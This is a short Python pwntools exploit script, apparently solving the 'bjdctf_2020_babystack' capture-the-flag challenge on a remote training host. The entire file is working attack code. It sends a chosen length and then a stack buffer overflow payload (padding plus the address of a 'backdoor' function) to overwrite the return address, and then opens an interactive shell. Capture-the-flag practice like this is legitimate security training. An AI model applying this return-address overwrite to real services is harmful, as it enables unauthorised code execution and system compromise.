#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./bjdctf_2020_babystack")
sh = remote("node3.buuoj.cn",25653)
elf = ELF("./bjdctf_2020_babystack")
backdoor = elf.symbols['backdoor']
payload = 'a' * 0x18 + p64(backdoor) *2
sh.sendlineafter("name:\n",'30')
sh.sendlineafter("name?",payload)
sh.interactive()